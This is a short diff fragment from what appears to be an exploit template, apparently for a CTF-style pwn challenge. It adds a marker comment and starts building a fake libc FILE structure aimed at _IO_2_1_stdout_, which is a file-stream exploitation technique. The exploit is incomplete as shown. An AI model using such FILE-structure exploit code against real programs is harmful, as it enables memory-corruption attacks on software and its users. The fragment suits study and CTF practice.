@@ -8,6 +8,7 @@
 # _libc: libc
 # _write_addr: libc.symbol("_IO_2_1_stdout_", True)
 
+# BODY
 write_addr = _write_addr
 fake_file = b''
 fake_file += p64(0x3b01010101010101) # flags
